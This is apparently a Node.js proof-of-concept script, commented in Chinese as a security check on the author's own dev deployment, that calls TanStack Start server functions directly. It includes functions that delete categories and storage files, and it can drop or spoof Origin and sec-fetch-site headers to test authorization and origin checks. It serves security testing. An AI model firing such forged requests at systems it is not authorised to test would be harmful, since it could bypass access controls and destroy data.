// 安全检测 PoC:验证 TanStack Start server function 是否可被未授权直调。
// 用法:node scripts/sec-poc-serverfn.mjs <fnName> '<argsJson>' [--no-origin]
// 仅针对自有 dev 环境(torchwood-blog-dev.deeploop.run)。
import { toJSONAsync, fromCrossJSON } from 'seroval'

const BASE = 'https://torchwood-blog-dev.deeploop.run'
const IDS = {
  createCategory: '96ffab79262343c4b20c8bb6c58d9e63f9d8b82b0f90169e3bc066ca87a94ad2',
  deleteCategory: 'd77a92147f763545169c1885e518c06fb5afc0446799de6c0c54c04448564b1d',
  renameCategory: 'ce1b3447b04400a77ea5c087da3fa4cb41e9074878c626b75a88dbed54b85d8d',
  cleanupCommentsForPost: '424b3ebb8f8cbbafb3d984a3a9376b3577d717d850a186df8891b9b03b9118e2',
  getFiles: 'd46fbe7aa4c83ac30d0014f8f70066d59a322cc55fa32cd90fcda5b75d7ae014',
  deleteStorageFiles: '84492224ac261e0b6bb274a7722ecbc1fa696ad3d1ea2dcd64bae2cb548ef3c4',
}

const fn = process.argv[2]
const args = JSON.parse(process.argv[3] ?? '{}')
const noOrigin = process.argv.includes('--no-origin')
const id = IDS[fn]
if (!id) {
  console.error('unknown fn:', fn)
  process.exit(2)
}

const body = JSON.stringify(await toJSONAsync({ data: args }))
const headers = {
  'x-tsr-serverFn': 'true',
  'content-type': 'application/json',
  accept: 'application/x-tss-framed, application/x-ndjson, application/json',
}
if (!noOrigin) headers['origin'] = BASE
if (process.argv.includes('--sfs')) headers['sec-fetch-site'] = 'same-origin'
if (process.argv.includes('--origin-http')) headers['origin'] = BASE.replace('https', 'http')

const res = await fetch(`${BASE}/_serverFn/${id}`, { method: 'POST', headers, body })
console.log('>>>', fn, JSON.stringify(args), noOrigin ? '(no origin)' : '')
console.log('status:', res.status)
console.log('headers:', JSON.stringify(Object.fromEntries(res.headers)))
const text = await res.text()
let decoded = text
if (res.headers.get('x-tss-serialized') && text.trim().startsWith('{')) {
  try {
    decoded = JSON.stringify(fromCrossJSON(JSON.parse(text)))
  } catch (e) {
    decoded = `${text}  [decode failed: ${e.message}]`
  }
}
console.log('body:', decoded.slice(0, 800))
